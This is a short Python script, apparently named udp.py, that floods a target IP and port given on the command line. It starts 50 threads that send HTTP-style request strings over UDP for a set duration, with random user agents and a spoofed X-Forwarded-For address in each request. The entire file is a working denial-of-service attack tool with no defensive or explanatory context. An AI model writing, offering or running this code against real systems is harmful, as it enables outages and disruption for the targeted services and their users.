import socket
import threading
import random
import time
from fake_useragent import UserAgent

def ddos_attack(ip, port, duration, method):
    target_ip = ip
    target_port = port
    attack_duration = time.time() + duration
    user_agent = UserAgent()

    while time.time() < attack_duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fake_ip = '.'.join([str(random.randint(1, 255)) for _ in range(4)])
            message = f"{method} / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent.random}\r\nX-Forwarded-For: {fake_ip}\r\n\r\n"

            sock.sendto(message.encode(), (target_ip, target_port))
            sock.close()

        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 5:
        print("Usage: python udp.py <target_ip> <target_port> <attack_duration> <method>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attack_duration = int(sys.argv[3])
    method = sys.argv[4]

    for i in range(50):
        thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, attack_duration, method))
        thread.start()
